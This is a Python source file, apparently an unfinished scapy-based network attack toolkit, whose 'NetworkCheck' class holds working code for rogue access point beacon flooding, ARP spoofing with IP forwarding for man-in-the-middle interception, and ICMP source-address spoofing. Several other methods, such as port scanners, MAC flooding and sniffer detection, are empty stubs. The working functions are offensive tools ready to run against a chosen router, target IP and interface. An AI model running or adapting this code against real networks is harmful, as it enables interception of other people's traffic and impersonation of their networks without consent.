#!/usr/bin/python3

import os
import random
from os import geteuid, system
from random import randrange

import requests

try:
    from scapy.all import (ARP, ICMP, IP, TCP, UDP, Dot11, Dot11Beacon,
                           Dot11Elt, Ether, RadioTap, RandIP, RandMAC, conf,
                           promiscping, send, sendp, sr1, srp)
except:
    print('Module: >scapy< not found.')

if int(geteuid()) != 0:
    print("You must be a root to use this module")
else:
    pass

conf.verb = 0  # ignoring scapy outputs


class NetworkCheck:
    """
    Module for programming offensive and defensive networking tools based on scapy
    """
    def __init__(self):
        pass

    # creating fake access points
    def create_beacons(self, target_ESSID, interface, target_MAC):
        """
        This method is creating fake access points
        """
        self.interface = interface
        self.target_ESSID = target_ESSID
        self.target_MAC = target_MAC

        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=str(self.target_MAC), addr3=str(self.target_MAC))
        beacons = Dot11Beacon()
        essid = Dot11Elt(ID='SSID', info=str(self.target_ESSID), len=len(self.target_ESSID))
        frames = RadioTap()/dot11/beacons/essid
        sendp(frames, inter=0.1, iface=str(self.interface), loop=1)

    # ARP spoofing for MITM attacks
    def arp_spoof(self, router_ip, target_ip, interface):
        """
        This metod is for ARP spoofing.
        Example usage: nttl.arpSpoof(router_ip='192.168.1.1', target_ip='192.168.1.154', interface='wlan0')
        """
        self.router_ip = router_ip
        self.target_ip = target_ip
        self.interface = interface

        # parsing MAC address
        mac_addr = f"ifconfig {self.interface} | grep -o 'ether [a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*' | cut -c7-23 > mac.txt"
        system(mac_addr)
        get_mac = open('mac.txt', 'r').read().split('\n')
        system('rm -rf mac.txt')

        # enabling IP forwarding
        system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
        try:
            # sending fake ARP requests
            while True:
                send(ARP(op=2, pdst=self.target_ip, hwsrc=get_mac[0], psrc=self.router_ip), verbose=0)
        except:
            # disabling IP forwarding if any exception occurs
            system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")

    # alive host scanning
    def host_prober(self, interface, subnet):
        """
        This method is for probing alive hosts on desired network.
        Example usage: nttl.host_prober(interface='wlan0', subnet='192.168.1.0/24')
        """
        self.interface = interface
        self.subnet = subnet

        # creating ARP request packets
        pass

    # TCP stealth port scanning
    def tcp_port_scanner(self):
        """

        """
        pass

    # UDP port scanning
    def udp_port_scanning(self):
        """

        """
        pass

    # enabling wireless monitoring
    def enable_monitor(self, interface):
        """

        """
        pass

    # disabling wireless monitoring - cleaning everything
    def disable_monitor(self):
        """

        """
        pass

    # getting device vendor by target's MAC address
    def get_vendor(self, target_MAC):
        """

        """
        pass

    # simulating MAC flood attacks
    def MAC_flood(self, interface, target_ip):
        """
        # TODO
        """
        self.interface = interface
        self.target_ip = target_ip

    # sniffer detection
    def bad_nose(self):
        """

        """
        pass

    # IP spoofing
    def ip_spoof(self, fake_ip, target_ip):
        """

        """
        self.fake_ip = fake_ip
        self.target_ip = target_ip

        pack_spoof = IP(src=self.fake_ip, dst=self.target_ip)/ICMP()
        send(pack_spoof)
